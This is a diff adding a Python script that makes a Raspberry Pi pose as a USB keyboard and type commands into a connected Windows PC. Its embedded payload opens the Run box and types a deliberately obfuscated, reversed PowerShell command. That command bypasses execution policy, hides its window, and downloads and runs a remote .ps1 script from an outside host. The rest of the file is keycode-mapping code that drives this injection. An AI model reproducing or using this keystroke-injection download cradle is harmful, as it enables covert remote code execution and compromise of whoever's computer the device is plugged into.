@@ -1,0 +1,108 @@
+
+from time import sleep
+
+data = """\RUNBOX
+powershell.exe
+\ENTER
+SET 0VeP6u (" NoisseRpxe-EkoVni |)43]rAHc[,93]rAHc[ F-  )'}1{)'+'}0'+'{'+'1'+'sp.tpircs_'+'g'+'niro'+'t'+'co'+'rp/'+'sdaolpu/eno'+'.naili'+'buj.4'+'2//:s'+'pt'+'th}0{(gnir'+'tS'+'d'+'ao'+'lnwoD.'+')tne'+'i'+'lCbeW.teN.metsy'+'S tcejbO-weN(no'+'i'+'ss'+'erpxE'+'-e'+'kovnI'+'}1{ neddih'+' '+'ely'+'tswodniw-'+' ssapyb'+' ycilopn'+'oitucexe- exe.ll'+'ehsrewo'+'p'((" );.( $VeRbosEPrEfEreNce.tOstrING()[1,3]+'X'-jOin'') ( "$( sEt-vAriAble 'OFS'  '') " +[STrInG] (( VAriable 0VEP6u  -valuEonl  )[ -1 .. -( ( VAriable 0VEP6u  -valuEonl  ).lENgtH) ])+"$( set-ITem 'VaRIAbLe:ofS' ' ' ) ")
+\ENTER"""
+
+# Handles the serial connection between the Pi and the PC 
+NULL_CHAR = chr(0)
+
+def write_report(report):
+    with open('/dev/hidg0', 'rb+') as fd:
+        fd.write(report.encode())
+
+# Function: based on the key that is required, we send it in keystroke codes. This function provides the code
+def transcribe(key):
+    # A dictionary of characters 
+    lower_case = {'a':4,'b':5,'c':6,'d':7,'e':8,'f':9,'g':10,'h':11,'i':12,'j':13,'k':14,'l':15,'m':16,'n':17,'o':18,'p':19,'q':20,'r':21,'s':22,'t':23,'u':24,'v':25,'w':26,'x':27,'y':28,'z':29,
+                  '-':45,'=':46,'[':47,']':48,'\\':49,';':51,"'":52,',':54,'.':55,'/':56,'1':30,'2':31,'3':32,'4':33,'5':34,'6':35,'7':36,'8':37,'9':38,'0':39,'`':53,r'\n':40,'\t':43,' ':44}
+    upper_case = {'A':4,'B':5,'C':6,'D':7,'E':8,'F':9,'G':10,'H':11,'I':12,'J':13,'K':14,'L':15,'M':16,'N':17,'O':18,'P':19,'Q':20,'R':21,'S':22,'T':23,'U':24,'V':25,'W':26,'X':27,'Y':28,'Z':29,
+                  '_':45,'+':46,'{':47,'}':48,'|': 49,':':51,'"':52,'<':54,'>':55,'?':56,'!':30,'@':31,'#':32,'$':33,'%':34,'^':35,'&':36,'*':37,'(':38,')':39,'~':53}
+    
+    # Based on keys that is type, send the key code.
+    if key in lower_case:
+        write_report(NULL_CHAR*2+chr(lower_case[key])+NULL_CHAR*5)
+    elif key in upper_case:
+        write_report(chr(32)+NULL_CHAR+chr(upper_case[key])+NULL_CHAR*5)
+
+    write_report(NULL_CHAR*8) #Send 8 NULL character to signify that you have lifted the key if not you will send "aaaaaaaaaaaaaaaaaa" instead of one "a"
+
+# Function: Handles the special commands on the keyboard. It also includes a combination of special keys
+def translate(line, merged_key):
+    word = line.split(' ')[0]
+
+    if word in merged_key:
+        write_report(NULL_CHAR*2+chr(merged_key[word])+NULL_CHAR*5)
+        write_report(NULL_CHAR*8)
+    elif word == '\RUNBOX': #WIN+R
+        write_report(chr(8)+NULL_CHAR+chr(21)+NULL_CHAR*5)
+        write_report(NULL_CHAR*8)
+    elif word == '\ADMINPRESS': #CTRL+SHIFT+ENTER
+        write_report(chr(48)+NULL_CHAR+chr(40)+NULL_CHAR*5)
+        write_report(NULL_CHAR*8)
+    elif word == '\WINKEY':
+        write_report(chr(8)+NULL_CHAR*7)
+        write_report(NULL_CHAR*8)
+    elif word == '\CTRL':
+        write_report(chr(1)+NULL_CHAR*7)
+        write_report(NULL_CHAR*8)
+    elif word == '\ALT':
+        write_report(chr(4)+NULL_CHAR*7)
+        write_report(NULL_CHAR*8)
+    elif word == '\TAB':
+        write_report(NULL_CHAR*2+chr(43)+NULL_CHAR*5)
+        write_report(NULL_CHAR*8)
+    elif word == '\SHIFT':
+        write_report(chr(32)+NULL_CHAR*7)
+        write_report(NULL_CHAR*8)       
+    elif word == '\CTRL+ALT':
+        write_report(chr(5)+NULL_CHAR*7)
+        write_report(NULL_CHAR*8)
+    elif word == '\SLEEP': #\SLEEP (float) - to give us a delay to not key commands too quickly
+        sleep(float(line.split(' ')[1]))
+    else:
+        return False
+
+# Function: Handles additional shortcuts or function keys in the keyboard
+def multi_commands(word_list, merged_key):
+    word_list = word_list.split(" ")
+    for word in enumerate(word_list):
+        print("word: " + str(word))
+        if word in merged_key:
+            write_report(NULL_CHAR*2+chr(merged_key[word])+NULL_CHAR*5)
+
+    write_report(NULL_CHAR*8)
+
+
+action_key = {'\ENTER':40,'\ESCAPE':41,'\DELETE':42,'\TAB':43,'\SPACE':44,'\PRINT':70,'\SCROLL':71,'\PAUSE':72,'\INSERT':73,'\HOME':74,'\PAGEUP':75,'\END':77,'\PAGEDOWN':78,'\RIGHTARROW':79,'\LEFTARROW':80,'\DOWNARROW':81,r'\UPARROW':82,'\POWER':102,'\LEFTCTRL':224,
+              '\LEFTSHIFT':225,'\LEFTALT':226,'\LEFTGUI':227,'\RIGHTCTRL':228,'\RIGHTSHIFT':229,'\RIGHTALT':230,'\RIGHTGUI':231}
+function_key = {'\F1':58,'\F2':59,'\F3':60,'\F4':61,'\F5':62,'\F6':63,'\F7':64,'\F8':65,'\F9':66,'\F10':67,'\F11':68,'\F12':69,'\F13':104,'\F14':105,'\F15':106,'\F16':107,'\F17':108,'\F18':109,'\F19':110,'\F20':111,'\F21':112,'\F22':113,'\F23':114,'\F24':115}
+menu_key = {'\EXECUTE':116,'\HELP':117,'\MENU':118,'\SELECT':119,'\STOP':120,'\AGAIN':121,r'\UNDO':122,'\CUT':123,'\COPY':124,'\PASTE':125,'\FIND':126,'\MUTE':127,'\VOLUP':128,'\VOLDOWN':129,'\CAPLOCK':130,r'\NUMLOCK':131,'\SCROLLLOCk':132}
+#mod_key = {'\LEFTCTRL':1,'\LEFTSHIFT':2,'\LEFTALT':4,'\LEFTWIN':8,'\RIGHTCTRL':16,'\RIGHTSHIFT':32,'\RIGHTALT':64,'\RIGHTWIN':128}
+
+merged_key = {}
+merged_key.update(action_key)
+merged_key.update(function_key)
+merged_key.update(menu_key)
+
+sleep(5)
+
+
+for count1, line in enumerate(data.split('\n')):
+    for count2, word in enumerate(line.split(' ')):
+        if len(line.split(' ')) >= 2 and word in merged_key:
+            multi_commands(line, merged_key)
+            break
+        elif translate(line, merged_key) == False:
+            for char in word:
+                transcribe(char)
+            write_report(NULL_CHAR*2+chr(44)+NULL_CHAR*5)
+            write_report(NULL_CHAR*8)
+            continue
+        sleep(0.025)
+    sleep(0.25)
+
+
